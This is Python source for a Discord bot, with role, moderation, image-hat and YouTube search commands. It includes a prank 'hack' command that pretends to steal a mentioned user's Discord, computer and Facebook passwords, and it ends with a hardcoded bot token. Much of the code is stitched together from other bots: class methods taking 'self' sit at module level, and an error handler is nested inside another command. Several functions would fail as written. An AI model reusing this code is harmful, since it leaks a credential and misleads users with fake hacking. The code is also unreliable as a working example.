      embed=discord.Embed(title="Click on this link to invite:", description="https://discordapp.com/oauth2/authorize?client_id=520550412219318272&permissions=8&scope=bot" , color=0x00fd1b)
      await client.say(embed=embed)

@client.command(pass_context = True)
async def bottutorial(ctx, *, msg = None):
    new_message = msg.replace(" ", "_")
    if not msg: await client.say("You can check https://github.com/uksoftworld/discord.py-tutorial/ for more information")
    if '@here' in msg or '@everyone' in msg:
      return
    else: await client.say(f'https://github.com/uksoftworld/discord.py-tutorial/blob/master/{new_message}' + '.py')
    return

@client.command(pass_context = True)
async def dyno(ctx, *, msg = None):
    if not msg: await client.say("You can check https://github.com/uksoftworld/dynoCC for more information")
    if '@here' in msg or '@everyone' in msg:
      return
    else: await client.say('https://github.com/uksoftworld/dynoCC/blob/master/' + msg)
    return

@client.command(pass_context = True)
async def heroku(ctx, *, msg = None):
    if not msg: await client.say("Tag a user please")
    if '@here' in msg or '@everyone' in msg:
      return
    else: await client.say('Host your bot on heroku. Check: https://www.youtube.com/watch?v=avEgttTLZgo' + msg)
    return

@client.command(pass_context=True)
async def unverify(ctx):
    await client.delete_message(ctx.message)
    role = discord.utils.get(ctx.message.server.roles, name='Unverified')
    await client.add_roles(ctx.message.author, role)
    
@client.command(pass_context=True)
async def verify(ctx):
    if ctx.message.author.bot:
      return
    else:
      await client.delete_message(ctx.message)
      role = discord.utils.get(ctx.message.server.roles, name='Verified')
      await client.add_roles(ctx.message.author, role)
    
@client.command(pass_context=True)
@commands.has_permissions(administrator=True)
async def friend(ctx, user:discord.Member,):
    if ctx.message.author.bot:
      return
    else:
      await client.delete_message(ctx.message)
      role = discord.utils.get(ctx.message.server.roles, name='Friend of Owner')
      await client.add_roles(ctx.message.mentions[0], role)

@client.command(pass_context = True)
@commands.has_permissions(administrator=True)     
async def makemod(ctx, user: discord.Member):
    nickname = '♏' + user.name
    await client.change_nickname(user, nickname=nickname)
    role = discord.utils.get(ctx.message.server.roles, name='Moderator')
    await client.add_roles(user, role)
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    embed = discord.Embed(color = discord.Color((r << 16) + (g << 8) + b))
    embed.set_author(name='Congratulations Message')
    embed.add_field(name = '__Congratulations__',value ='**Congratulations for mod.Hope you will be more active here. Thanks for your help and support.**',inline = False)
    embed.set_image(url = 'https://preview.ibb.co/i1izTz/ezgif_5_e20b665628.gif')
    await client.send_message(user,embed=embed)
    await client.delete_message(ctx.message)
    
@client.command(pass_context = True)
@commands.has_permissions(administrator=True)     
async def removemod(ctx, user: discord.Member):
    nickname = user.name
    await client.change_nickname(user, nickname=nickname)
    role = discord.utils.get(ctx.message.server.roles, name='Moderator')
    await client.remove_roles(user, role)
    await client.delete_message(ctx.message)

@client.command(pass_context = True)
async def botwarncode(ctx):
    await client.say('https://pastebin.com/ibogudoxot.py')
    return

@client.command(pass_context=True)
async def guess(ctx, number):
    try:
        arg = random.randint(1, 10)
    except ValueError:
        await client.say("Invalid number")
    else:
        await client.say('The correct answer is ' + str(arg))

@client.command(pass_context=True)
@commands.has_permissions(kick_members=True) 
async def roles(context):
	"""Displays all of the roles with their ids"""
	roles = context.message.server.roles
	result = "The roles are "
	for role in roles:
		result += '``' + role.name + '``' + ": " + '``' + role.id + '``' + "\n "
	await client.say(result)
    
@client.command(pass_context=True, aliases=['server'])
@commands.has_permissions(kick_members=True)
async def membercount(ctx, *args):
    if ctx.message.channel.is_private:
        await bot.delete_message(ctx.message)
        return

    g = ctx.message.server

    gid = g.id
    membs = str(len(g.members))
    membs_on = str(len([m for m in g.members if not m.status == Status.offline]))
    users = str(len([m for m in g.members if not m.bot]))
    users_on = str(len([m for m in g.members if not m.bot and not m.status == Status.offline]))
    bots = str(len([m for m in g.members if m.bot]))
    bots_on = str(len([m for m in g.members if m.bot and not m.status == Status.offline]))
    created = str(g.created_at)
    
    em = Embed(title="Membercount")
    em.description =    "```\n" \
                        "Members:   %s (%s)\n" \
                        "  Users:   %s (%s)\n" \
                        "  Bots:    %s (%s)\n" \
                        "Created:   %s\n" \
                        "```" % (membs, membs_on, users, users_on, bots, bots_on, created)

    await client.send_message(ctx.message.channel, embed=em)
    await client.delete_message(ctx.message)	
@client.command(pass_context=True)
@commands.has_permissions(administrator=True)
async def embed(ctx, *args):
    if ctx.message.author.bot:
      return
    else:
      argstr = " ".join(args)
      r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
      text = argstr
      color = discord.Color((r << 16) + (g << 8) + b)
      await client.send_message(ctx.message.channel, embed=Embed(color = color, description=text))
      await client.delete_message(ctx.message)    

    async def on_command_error(self, ctx, error):
        # if command has local error handler, return
        if hasattr(ctx.command, 'on_error'):
            return

        # get the original exception
        error = getattr(error, 'original', error)

        if isinstance(error, commands.CommandNotFound):
            return

        if isinstance(error, commands.BotMissingPermissions):
            missing = [perm.replace('_', ' ').replace('guild', 'server').title() for perm in error.missing_perms]
            if len(missing) > 2:
                fmt = '{}, and {}'.format("**, **".join(missing[:-1]), missing[-1])
            else:
                fmt = ' and '.join(missing)
            _message = 'I need the **{}** permission(s) to run this command.'.format(fmt)
            await ctx.send(_message)
            return

        if isinstance(error, commands.DisabledCommand):
            await ctx.send('This command has been disabled.')
            return

        if isinstance(error, commands.CommandOnCooldown):
            await ctx.send("This command is on cooldown, please retry in {}s.".format(math.ceil(error.retry_after)))
            return

        if isinstance(error, commands.MissingPermissions):
            missing = [perm.replace('_', ' ').replace('guild', 'server').title() for perm in error.missing_perms]
            if len(missing) > 2:
                fmt = '{}, and {}'.format("**, **".join(missing[:-1]), missing[-1])
            else:
                fmt = ' and '.join(missing)
            _message = 'You need the **{}** permission(s) to use this command.'.format(fmt)
            await ctx.send(_message)
            return

        if isinstance(error, commands.UserInputError):
            await ctx.send("Invalid input.")
            await self.send_command_help(ctx)
            return

        if isinstance(error, commands.NoPrivateMessage):
            try:
                await ctx.author.send('This command cannot be used in direct messages.')
            except discord.Forbidden:
                pass
            return

        if isinstance(error, commands.CheckFailure):
            await ctx.send("You do not have permission to use this command.")
            return

        # ignore all other exception types, but print them to stderr
        print('Ignoring exception in command {}:'.format(ctx.command), file=sys.stderr)

        traceback.print_exception(type(error), error, error.__traceback__, file=sys.stderr)

@client.command(pass_context=True)
async def hats(ctx):
    print("Showing available hats in {}".format(ctx.message.server))
    await client.send_file(ctx.message.channel, "crimmis_hats/hats.png", filename="hats.png", content="All the available hats:")


def check_hat(args):
    """ Helper function that handles hat manipulations, like flip and scale """
    folder = get_imgs("crimmis_hats/")
    hat = Image.open(folder.get('0'))
    for arg in args:
        if arg.startswith('type='):
            value = arg.split('=')[1]
            hat = Image.open(folder.get(value))

    w_offset, h_offset = 150, 0
    hat_width, hat_height = 350, 300
    for arg in args:
        if arg == 'flip':
            hat = hat.transpose(Image.FLIP_LEFT_RIGHT)
            w_offset, h_offset = 0, 0
        if arg.startswith('scale='):
            value = float(arg.split('=')[1])
            hat_width, hat_height = int(hat.width * value), int(hat.height * value)

    hat = hat.resize((hat_width, hat_height))
    return hat, w_offset, h_offset


def move(args, width, height):
    """ Helper function used to shift the hat in a certain direction """
    for arg in args:
        if arg.startswith('left='):
            value = arg.split('=')[1]
            width -= int(value)
        if arg.startswith('right='):
            value = arg.split('=')[1]
            width += int(value)
        if arg.startswith('up='):
            value = arg.split('=')[1]
            height -= int(value)
        if arg.startswith('down='):
            value = arg.split('=')[1]
            height += int(value)
    return width, height


@client.command(pass_context=True)
async def hat(ctx, *args):
    """ Handles creating and returning a hat to a user """
    print("Making hat for {} in {} \t Arguments: {}".format(ctx.message.author, ctx.message.server, args))
    message = ctx.message

    if len(message.attachments) > 0:
        url = message.attachments[0].get('url')
    else:
        url = message.author.avatar_url

    response = requests.get(url, headers={'User-agent': 'Mozilla/5.0'})
    image = Image.open(BytesIO(response.content)).resize((500, 500))

    hat, width, height = check_hat(args)

    image.paste(hat, move(args, width, height), mask=hat)
    image.save("crimmis_hats/remade.png")

    if message.author.id in users:
        await client.delete_message(users.get(message.author.id))

    image = await client.send_file(message.channel, "crimmis_hats/remade.png", filename="newhat.png", content="Hat: ")
    users[message.author.id] = image

@commands.command
async def search(self, ctx):
        """Searches YouTube for a video. 
        Returns the first result."""
        try:
            if len(ctx.message.content.split(' ', 2)) == 2:
                await ctx.send("Arguments needed!\n\nExample: `N!search Thunder PlayZ`")
            else:
                youtube = build("youtube", "v3", developerKey=youtube_key)
                search_response = youtube.search().list(q=ctx.message.content.split(
                    ' ', 2)[2], part="id,snippet", maxResults=1, type="video").execute()
                if len(search_response.get('items')) == 0:
                    await ctx.send("No videos found.")
                else:
                    vidid = search_response.get('items')[0]['id']['videoId']
                    vidurl = "https://www.youtube.com/watch?v=" + vidid
                    yt_url = "http://www.youtube.com/oembed?url={0}&format=json".format(
                        vidurl)
                    metadata = await self.get_json(yt_url)
                    data = discord.Embed(
                        title="**__Search Result__**", colour=discord.Colour(value=11735575))
                    data.add_field(name="Video Title", value=metadata[
                                   'title'], inline=False)
                    data.add_field(name="Video Uploader", value=metadata[
                                   'author_name'], inline=False)
                    data.add_field(name="Video Link",
                                   value=vidurl, inline=False)
                    data.set_image(
                        url="https://i.ytimg.com/vi/{}/hqdefault.jpg".format(vidid))
                    data.set_footer(
                        text="Made with \U00002665 by Francis#6565. Support server: https://discord.gg/yp8WpMh")
                    try:
                        await ctx.send(embed=data)
                        statsd.increment('client.commands.run', 1)
                    except discord.HTTPException:
                        statsd.increment('client.commands.errored', 1)
                        logger.exception("Missing embed links perms")
                        await ctx.send("Looks like the bot doesn't have embed links perms... It kinda needs these, so I'd suggest adding them!")
        except Exception as e:
            logger.exception(e)
            statsd.increment('bot.commands.errored', 1)
            data = discord.Embed(title="__***Error in video search!***__",
                                 description="No data for video ID!", colour=discord.Colour(value=11735575))
            data.add_field(name="Whoops!", value="Looks like the API returned a video, but there is no associated data with it!\nThis could be due to the video being unavailable anymore, or it is country blocked!", inline=False)
            data.add_field(name="What can I do now?",
                           value="Not much really. *__Please don't re-search the video__*, as this adds unnecessary strain on the bot, and you'll get the same result.", inline=False)
            data.set_footer(text="Made with \U00002665 by Francis#6565")
            try:
                await ctx.send(embed=data)
            except discord.HTTPException:
                logger.exception("Missing embed links perms")
                await ctx.send("Looks like the bot doesn't have embed links perms... It kinda needs these, so I'd suggest adding them!")

@commands.command
async def channel(self, ctx):
        """Searches YouTube for a channel. 
        Returns the first result."""
        try:
            if len(ctx.message.content.split(' ', 2)) == 2:
                await ctx.send("Arguments needed!\n\nExample: `N!channel TrapNation`")
            else:
                youtube = build("youtube", "v3", developerKey=youtube_key)
                search_response = youtube.search().list(q=ctx.message.content.split(
                    ' ', 2)[2], part="id,snippet", maxResults=1, type="channel").execute()
                if len(search_response.get('items')) == 0:
                    await ctx.send("No channels found.")
                else:
                    chanid = search_response.get('items')[0]['id']['channelId']
                    data = youtube.channels().list(part='statistics,snippet', id=chanid).execute()
                    subs = str(data['items'][0]['statistics']
                               ['subscriberCount'])
                    subsf = await self.thous(subs)
                    name = str(data['items'][0]['snippet']['title'])
                    img = str(data['items'][0]['snippet'][
                              'thumbnails']['medium']['url'])
                    chanurl = "https://www.youtube.com/channel/" + chanid
                    data = discord.Embed(
                        title="**__Search Result__**", colour=discord.Colour(value=11735575))
                    data.add_field(name="Channel Name",
                                   value=name, inline=False)
                    data.add_field(name="Subscribers",
                                   value=subsf, inline=False)
                    data.add_field(name="Channel Link",
                                   value=chanurl, inline=False)
                    data.set_image(url=img)
                    data.set_footer(
                        text="Made with \U00002665 by Francis#6565. Support server: https://discord.gg/yp8WpMh")
                    try:
                        await ctx.send(embed=data)
                        statsd.increment('bot.commands.run', 1)
                    except discord.HTTPException:
                        statsd.increment('bot.commands.errored', 1)
                        logger.exception("Missing embed links perms")
                        await ctx.send("Looks like the bot doesn't have embed links perms... It kinda needs these, so I'd suggest adding them!")
        except Exception as e:
            logger.exception(e)
            statsd.increment('bot.commands.errored', 1)
            data = discord.Embed(title="__***Error in channel search!***__",
                                 description="No data for channel ID!", colour=discord.Colour(value=11735575))
            data.add_field(name="Whoops!", value="Looks like the API returned a channel, but there is no associated data with it!\nThis could be due to the video being unavailable anymore, or it is country blocked!", inline=False)
            data.add_field(name="What can I do now?",
                           value="Not much really. *__Please don't re-search the channel__*, as this adds unnecessary strain on the bot, and you'll get the same result.", inline=False)
            data.set_footer(text="Made with \U00002665 by King Nova #0416")
            try:
                await ctx.send(embed=data)
            except discord.HTTPException:
                logger.exception("Missing embed links perms")
                await ctx.send("Looks like the bot doesn't have embed links perms... It kinda needs these, so I'd suggest adding them!")

@commands.command
async def lookup(self, ctx):
        """Reverse lookup for youtube videos. Returns statistics and stuff"""
        try:
            if len(ctx.message.content.split(' ', 2)) == 2:
                await ctx.send("Arguments needed!\n\nExample: `yt lookup https://www.youtube.com/watch?v=dQw4w9WgXcQ`")
            else:
                url = re.compile(
                    r'http(?:s?):\/\/(?:www\.)?youtu(?:be\.com\/watch\?v=|\.be\/)([\w\-\_]*)(&(amp;)?‌​[\w\?‌​=]*)?')
                shorturl = re.compile(
                    r'http(?:s?):\/\/?youtu(?:\.be\/)([\w\-\_]*)(&(amp;)?‌​[\w\?‌​=]*)?')
                q = ctx.message.content.split(' ', 2)[2]
                match = re.search(url, q)
                if match:
                    match2 = re.search(shorturl, q)
                    if match2:
                        a = match2.group(1)
                        q = 'https://www.youtube.com/watch?v={}'.format(a)
                    yt_url = "http://www.youtube.com/oembed?url={0}&format=json".format(
                        q)
                    metadata = await self.get_json(yt_url)
                    youtube = build("youtube", "v3", developerKey=youtube_key)
                    search_response = youtube.search().list(q=ctx.message.content.split(
                        ' ', 2)[2], part="id,snippet", maxResults=1, type="video").execute()
                    if len(search_response.get('items')) == 0:
                        await ctx.send("No videos found.")
                    else:
                        vidid = search_response.get(
                            'items')[0]['id']['videoId']
                        data = discord.Embed(
                            title="**__Reverse Lookup__**", colour=discord.Colour(value=11735575))
                        data.add_field(name="Video Title", value=metadata[
                                       'title'], inline=False)
                        data.add_field(name="Video Uploader", value=metadata[
                                       'author_name'], inline=False)
                        data.add_field(name="Video Link",
                                       value=q, inline=False)
                        data.set_image(
                            url="https://i.ytimg.com/vi/{}/hqdefault.jpg".format(vidid))
                        data.set_footer(
                            text="Made with \U00002665 by King Nova'0416. Support server:'https://discord.gg/skVpd6'")
                    try:
                        await ctx.send(embed=data)
                        statsd.increment('bot.commands.run', 1)
                    except discord.HTTPException:
                        statsd.increment('bot.commands.errored', 1)
                        logger.exception("Missing embed links perms")
                        await ctx.send("Looks like the bot doesn't have embed links perms... It kinda needs these, so I'd suggest adding them!")
                else:
                    await ctx.send("Whoops! Looks like you didn't specify a URL for me to lookup!")
        except Exception as e:
            logger.exception(e)
            statsd.increment('bot.commands.errored', 1)
            data = discord.Embed(title="__***Error in reverse lookup!***__",
                                 description="No data for video ID!", colour=discord.Colour(value=11735575))
            data.add_field(name="Whoops!", value="Looks like the API returned info for the video, but there is no associated data with it!\nThis could be due to the video being unavailable anymore, or it is country blocked!", inline=False)
            data.add_field(name="What can I do now?",
                           value="Not much really. *__Please don't re-search the video__*, as this adds unnecessary strain on the bot, and you'll get the same result.", inline=False)
            data.set_footer(text="Made with \U00002665 by King Nova#0416")
            try:
                await ctx.send(embed=data)
            except discord.HTTPException:
                logger.exception("Missing embed links perms")
                await ctx.send("Looks like the bot doesn't have embed links perms... It kinda needs these, so I'd suggest adding them!")

@commands.command(aliases=['n'])
async def new(self, ctx):
        """Returns the newest video for the specified channel"""
        try:
            if len(ctx.message.content.split(' ', 2)) == 2:
                await ctx.send("Arguments needed!\n\nExample: `N!new Kurzgesagt`")
            else:
                youtube = build("youtube", "v3", developerKey=youtube_key)
                search_response = youtube.search().list(q=ctx.message.content.split(
                    ' ', 2)[2], part="id,snippet", maxResults=1, type="channel").execute()
                if len(search_response.get('items')) == 0:
                    await ctx.send("No channels found.")
                else:
                    chanid = search_response.get('items')[0]['id']['channelId']
                channelDetails = youtube.channels().list(
                    id=chanid, part="contentDetails", maxResults=1).execute()
                playlistid = channelDetails['items'][0][
                    'contentDetails']['relatedPlaylists']['uploads']
                videos = youtube.playlistItems().list(
                    playlistId=playlistid, part="snippet", maxResults=1).execute()
                if len(videos.get('items')) == 0:
                    await ctx.send("No channels found.")
                else:
                    vidid = videos['items'][0]['snippet'][
                        'resourceId']['videoId']
                    title = videos['items'][0]['snippet']['title']
                    dateraw = datetime.strptime(videos['items'][0]['snippet'][
                                                'publishedAt'], '%Y-%m-%dT%H:%M:%S.%fZ')
                    uploader = videos['items'][0]['snippet']['channelTitle']
                    # '%H:%M (GMT), %A %d %b %Y'
                    uploaddate = datetime.strftime(
                        dateraw, '%H:%M %A %d %b %Y')
                    data = discord.Embed(
                        title="**__Latest Video from {}__**".format(uploader), colour=discord.Colour(value=11735575))
                    data.add_field(name="Video Title",
                                   value=title, inline=False)
                    data.add_field(name="Upload Date",
                                   value=uploaddate, inline=False)
                    data.add_field(
                        name="Video Link", value="https://youtube.com/watch?v={}".format(vidid), inline=False)
                    data.set_image(
                        url="https://i.ytimg.com/vi/{}/mqdefault.jpg".format(vidid))
                    data.set_footer(
                        text="Made with \U00002665 by Francis#6565. Support server: https://discord.gg/yp8WpMh")
                try:
                    await ctx.send(embed=data)
                    statsd.increment('bot.commands.run', 1)
                except discord.HTTPException:
                    statsd.increment('bot.commands.errored', 1)
                    logger.exception("Missing embed links perms")
                    await ctx.send("Looks like the bot doesn't have embed links perms... It kinda needs these, so I'd suggest adding them!")
        except Exception as e:
            logger.exception(e)
            statsd.increment('bot.commands.errored', 1)

@client.command(pass_context=True)


async def hack(ctx, user: discord.Member):


    discord_password = "Foolish 654"


    computer_login = "I am fool"


    facebook = "Fooshy"


    msg = await client.say("Starting LEET Hack tool")


    await asyncio.sleep(1)


    msg2 = await client.edit_message(msg, "Starting LEET Hack tool.")


    await asyncio.sleep(1)


    msg3 = await client.edit_message(msg2, "Starting LEET Hack tool..")


    await asyncio.sleep(1)


    msg4 = await client.edit_message(msg3, "Starting LEET Hack tool...")


    await asyncio.sleep(1)


    msg5 = await client.edit_message(msg4, "Starting LEET Hack tool")


    await asyncio.sleep(1)


    msg6 = await client.edit_message(msg5, "Starting LEET Hack tool.")


    await asyncio.sleep(1)


    msg7 = await client.edit_message(msg6, "Starting LEET Hack tool..")


    await asyncio.sleep(1)


    msg8 = await client.edit_message(msg7, "Starting LEET Hack tool...")


    await asyncio.sleep(1)


    msg9 = await client.edit_message(msg8, "Starting LEET Hack tool")


    msg10 = await client.edit_message(msg9, "Successfully started the hack tool!")


    msg11 = await client.say(f"Looking for {user.mention}'s discord password in the discord database")


    await asyncio.sleep(3)


    await client.edit_message(msg11, f"Successfully found {user.mention}'s discord password in the discord database")


    msg12 = await client.say(f"Looking for {user.mention}'s computer login details")


    await asyncio.sleep(3)


    await client.edit_message(msg12, f"Successfully found {user.mention}'s computer login details")


    msg13 = await client.say(f"Looking for {user.mention}'s facebook login details in the facebook database, this might take some time")


    await asyncio.sleep(8)


    await client.edit_message(msg13, f"Successfully found {user.mention}'s facebook login details")



    await client.say(f"Master Nova is Sending all information i got from {user.mention} to you")

    await asyncio.sleep(3)


    await client.send_message(ctx.message.author, f"Discord Username : {user}\nDiscord Password : {discord_password}\nComputer Name : {user.name}-PC\nComputer Password : {computer_login}\nFacebook Username : {user.name} The Gamer\nFacebook Password : {facebook}")

    await client.say("Bot is checking if all information is correct....")
    await asyncio.sleep(5)


    await client.say("Master Nova has figured it out and sending you in dm's :white_check_mark:''")



client.run('NTIwNTUwNDEyMjE5MzE4Mjcy.Dv-mHA.iaoN15pFeyWHLgBKgDC0yxr8k8g')
